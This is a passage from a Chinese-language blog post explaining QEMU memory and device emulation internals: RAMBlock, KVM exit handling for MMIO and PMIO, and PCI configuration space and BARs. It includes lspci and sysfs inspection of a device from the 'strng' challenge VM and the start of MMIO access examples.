class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RAMBlock</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> *<span class="title">mr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> *host;</span><br><span class="line">    <span class="type">uint8_t</span> *colo_cache; <span class="comment">/* For colo, VM&#x27;s ram cache */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> used_length;</span><br><span class="line">    <span class="type">ram_addr_t</span> max_length;</span><br><span class="line">    <span class="type">void</span> (*resized)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">uint64_t</span> length, <span class="type">void</span> *host);</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">/* Protected by iothread lock.  */</span></span><br><span class="line">    <span class="type">char</span> idstr[<span class="number">256</span>];</span><br><span class="line">    <span class="comment">/* RCU-enabled, writes protected by the ramlist lock */</span></span><br><span class="line">    QLIST_ENTRY(RAMBlock) next;</span><br><span class="line">    QLIST_HEAD(, RAMBlockNotifier) ramblock_notifiers;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">size_t</span> page_size;</span><br><span class="line">    <span class="comment">/* dirty bitmap used during migration */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *bmap;</span><br><span class="line">    <span class="comment">/* bitmap of already received pages in postcopy */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *receivedmap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bitmap to track already cleared dirty bitmap.  When the bit is</span></span><br><span class="line"><span class="comment">     * set, it means the corresponding memory chunk needs a log-clear.</span></span><br><span class="line"><span class="comment">     * Set this up to non-NULL to enable the capability to postpone</span></span><br><span class="line"><span class="comment">     * and split clearing of dirty bitmap on the remote node (e.g.,</span></span><br><span class="line"><span class="comment">     * KVM).  The bitmap will be set only when doing global sync.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * It is only used during src side of ram migration, and it is</span></span><br><span class="line"><span class="comment">     * protected by the global ram_state.bitmap_mutex.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> this bitmap is different comparing to the other bitmaps</span></span><br><span class="line"><span class="comment">     * in that one bit can represent multiple guest pages (which is</span></span><br><span class="line"><span class="comment">     * decided by the `clear_bmap_shift&#x27; variable below).  On</span></span><br><span class="line"><span class="comment">     * destination side, this should always be NULL, and the variable</span></span><br><span class="line"><span class="comment">     * `clear_bmap_shift&#x27; is meaningless.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *clear_bmap;</span><br><span class="line">    <span class="type">uint8_t</span> clear_bmap_shift;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * RAM block length that corresponds to the used_length on the migration</span></span><br><span class="line"><span class="comment">     * source (after RAM block sizes were synchronized). Especially, after</span></span><br><span class="line"><span class="comment">     * starting to run the guest, used_length and postcopy_length can differ.</span></span><br><span class="line"><span class="comment">     * Used to register/unregister uffd handlers and as the size of the received</span></span><br><span class="line"><span class="comment">     * bitmap. Receiving any page beyond this length will bail out, as it</span></span><br><span class="line"><span class="comment">     * could not have been valid on the source.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> postcopy_length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对应关系如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-02_211915.png" alt=""></p><h2 id="设备模型"><a href="#设备模型" class="headerlink" title="设备模型"></a>设备模型</h2><p>QEMU 在用户空间中独立进行设备模拟，虚拟设备被其他的 VM 通过 hypervisor 提供的接口进行调用。由于设备的模拟是独立于 hypervisor 的，因此我们可以模拟任何设备，且该模拟设备可以在其他 hypervisor 间进行共享。</p><h3 id="IO处理"><a href="#IO处理" class="headerlink" title="IO处理"></a>IO处理</h3><p>当 VM 在访问某一虚拟设备对应的物理内存 / 端口时，控制权由 VM 转交到 Hypervisor，此时 QEMU 会根据触发 VM-exit 的事件类型进行不同的处理。</p><blockquote><p>accel/kvm/kvm-all.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kvm_cpu_exec</span><span class="params">(CPUState *cpu)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VCPU 退出运行，处理对应事件</span></span><br><span class="line"></span><br><span class="line">        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);</span><br><span class="line">        <span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line">            DPRINTF(<span class="string">&quot;handle_io\n&quot;</span>);</span><br><span class="line">            <span class="comment">/* Called outside BQL */</span></span><br><span class="line">            kvm_handle_io(run-&gt;io.port, attrs,</span><br><span class="line">                          (<span class="type">uint8_t</span> *)run + run-&gt;io.data_offset,</span><br><span class="line">                          run-&gt;io.direction,</span><br><span class="line">                          run-&gt;io.size,</span><br><span class="line">                          run-&gt;io.count);</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_MMIO:</span><br><span class="line">            DPRINTF(<span class="string">&quot;handle_mmio\n&quot;</span>);</span><br><span class="line">            <span class="comment">/* Called outside BQL */</span></span><br><span class="line">            address_space_rw(&amp;address_space_memory,</span><br><span class="line">                             run-&gt;mmio.phys_addr, attrs,</span><br><span class="line">                             run-&gt;mmio.data,</span><br><span class="line">                             run-&gt;mmio.len,</span><br><span class="line">                             run-&gt;mmio.is_write);</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h4 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h4><p>对于 MMIO 而言会调用到 <code>address_space_rw()</code> 函数，该函数会先将全局地址空间 <code>address_space_memory</code> 展开成 <code>FlatView</code> 后再调用对应的函数进行读写操作。</p><blockquote><p>softmmu/physmem.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">MemTxResult <span class="title function_">address_space_read_full</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                    MemTxAttrs attrs, <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemTxResult result = MEMTX_OK;</span><br><span class="line">    FlatView *fv;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        RCU_READ_LOCK_GUARD();</span><br><span class="line">        fv = address_space_to_flatview(as);</span><br><span class="line">        result = flatview_read(fv, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_write</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                                <span class="type">const</span> <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemTxResult result = MEMTX_OK;</span><br><span class="line">    FlatView *fv;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        RCU_READ_LOCK_GUARD();</span><br><span class="line">        fv = address_space_to_flatview(as);</span><br><span class="line">        result = flatview_write(fv, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_rw</span><span class="params">(AddressSpace *as, hwaddr addr, MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                             <span class="type">void</span> *buf, hwaddr len, <span class="type">bool</span> is_write)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_write) &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_write(as, addr, attrs, buf, len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address_space_read_full(as, addr, attrs, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作函数最后会根据 <code>FlatView</code> 找到目标内存对应的 <code>MemoryRegion</code>，对于函数表中定义了读写指针的 MR 而言最后会调用对应的函数指针完成内存访问工作，代码过多这里就不继续展开了：</p><blockquote><p>softmmu/physmem.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from RCU critical section.  */</span></span><br><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">flatview_write</span><span class="params">(FlatView *fv, hwaddr addr, MemTxAttrs attrs,</span></span><br><span class="line"><span class="params">                                  <span class="type">const</span> <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    hwaddr l;</span><br><span class="line">    hwaddr addr1;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    mr = flatview_translate(fv, addr, &amp;addr1, &amp;l, <span class="literal">true</span>, attrs);</span><br><span class="line">    <span class="keyword">if</span> (!flatview_access_allowed(mr, attrs, addr, len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> MEMTX_ACCESS_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flatview_write_continue(fv, addr, attrs, buf, len,</span><br><span class="line">                                   addr1, l, mr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Called from RCU critical section.  */</span></span><br><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">flatview_read</span><span class="params">(FlatView *fv, hwaddr addr,</span></span><br><span class="line"><span class="params">                                 MemTxAttrs attrs, <span class="type">void</span> *buf, hwaddr len)</span></span><br><span class="line">&#123;</span><br><span class="line">    hwaddr l;</span><br><span class="line">    hwaddr addr1;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    mr = flatview_translate(fv, addr, &amp;addr1, &amp;l, <span class="literal">false</span>, attrs);</span><br><span class="line">    <span class="keyword">if</span> (!flatview_access_allowed(mr, attrs, addr, len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> MEMTX_ACCESS_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flatview_read_continue(fv, addr, attrs, buf, len,</span><br><span class="line">                                  addr1, l, mr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h4><p>对于 <code>PMIO</code> 而言会调用到 <code>kvm_handle_io()</code> 函数，该函数实际上也是对 <code>address_space_rw()</code> 的封装，只不过使用的是<strong>端口地址空间</strong> <code>address_space_io</code>，最后也会调用到对应 <code>MemoryRegion</code> 的函数表中的读写函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kvm_handle_io</span><span class="params">(<span class="type">uint16_t</span> port, MemTxAttrs attrs, <span class="type">void</span> *data, <span class="type">int</span> direction,</span></span><br><span class="line"><span class="params">                          <span class="type">int</span> size, <span class="type">uint32_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        address_space_rw(&amp;address_space_io, port, attrs,</span><br><span class="line">                         ptr, size,</span><br><span class="line">                         direction == KVM_EXIT_IO_OUT);</span><br><span class="line">        ptr += size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pci设备地址空间"><a href="#pci设备地址空间" class="headerlink" title="pci设备地址空间"></a>pci设备地址空间</h2><blockquote><p>PCI（Peripheral Component Interconnect，外设组件互联）设备是一种计算机硬件设备，通过PCI总线与计算机的主板连接。PCI设备可以包括各种外部设备，如网卡、显卡、声卡、硬盘控制器、USB控制器等。PCI设备可以直接与计算机的主板连接，或者通过PCI插槽连接到主板上。PCI总线是一种高速数据传输接口，使得PCI设备可以与计算机进行快速的数据交换，从而实现各种输入输出功能。PCI设备的规范已经被不断发展和扩展，其中包括PCI Express（PCIe）等更高性能的接口。</p></blockquote><p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-19_163506.png" alt=""></p><p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-19_163623.png" alt=""></p><p>设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。</p><p>当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。</p><p>而相对于I/O内存，当最后一位为1时表示映射的I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。</p><p>通过memory space访问设备I/O的方式称为memory mapped I/O，即<strong>MMIO</strong>，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p><p>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，即<strong>PMIO</strong>,这种情况下CPU需要使用专门的I/O指令如<code>IN/OUT</code>访问I/O端口。</p><p>关于MMIO和PMIO，维基百科的描述是：</p><blockquote><p>Memory-mapped I/O (MMIO) and port-mapped I/O (PMIO) (which is also called isolated I/O) are two complementary methods of performing input/output (I/O) between the central processing unit (CPU) and peripheral devices in a computer. An alternative approach is using dedicated I/O processors, commonly known as channels on mainframe computers, which execute their own instructions.</p><p>翻译来自谷歌</p><p>内存映射 I/O (MMIO) 和端口映射 I/O (PMIO)（也称为隔离 I/O）是在中央处理单元 (CPU) 之间执行输入/输出 (I/O) 的两种互补方法。 ）和计算机中的外围设备。 另一种方法是使用专用 I/O 处理器，通常称为大型计算机上的通道，它们执行自己的指令。</p></blockquote><p>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p><p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p><h2 id="qemu中查看pci设备"><a href="#qemu中查看pci设备" class="headerlink" title="qemu中查看pci设备"></a>qemu中查看pci设备</h2><p>下面通过在qemu虚拟机中查看pci设备来进一步增进理解，仍然是基于strng这道题的qemu虚拟机。</p><p><code>lspci</code>命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p><p>pci设备的寻址是由总线、设备以及功能构成。如下所示：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p><p>可以使用lspci命令以树状的形式输出pci结构：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -t -v</span><br><span class="line">-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]</span><br><span class="line">           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI</span><br><span class="line">           +-02.0  Device 1234:1111</span><br><span class="line">           +-03.0  Device 1234:11e9</span><br><span class="line">           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller</span><br></pre></td></tr></table></figure><p>其中<code>[0000]</code>表示pci的域， PCI域最多可以承载256条总线。 每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p><p>总之每个 PCI 设备有一个总线号, 一个设备号, 一个功能号标识。PCI 规范允许单个系统占用多达 256 个总线, 但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)有最多 8 个功能。</p><p>PCI 设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  00ff</span><br><span class="line">Vendor: 1234</span><br><span class="line">Device: 11e9</span><br><span class="line">SVendor:        1af4</span><br><span class="line">SDevice:        1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ lspci -v -m -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  Unclassified device [00ff]</span><br><span class="line">Vendor: Vendor 1234</span><br><span class="line">Device: Device 11e9</span><br><span class="line">SVendor:        Red Hat, Inc</span><br><span class="line">SDevice:        Device 1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br></pre></td></tr></table></figure><p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config</span><br><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure><p>查看设备内存空间：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到该设备有两个空间：BAR0为MMIO空间，地址为<code>febf1000</code>，大小为256；BAR1为PMIO空间，端口地址为<code>0xc050</code>，大小为8。</p><p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">ls</span> -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">...</span><br><span class="line">-r--r--r--  1 root root 4096 Aug  1 03:40 resource</span><br><span class="line">-rw-------  1 root root  256 Jul 31 13:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Aug  1 04:01 resource1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>resource</code>文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。</p><h2 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I/O空间"></a>qemu中访问I/O空间</h2><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或在用户空间编程进行访问。</p><h3 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h3><p>编译内核模块，在内核态访问mmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><p>还有一种方式是在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 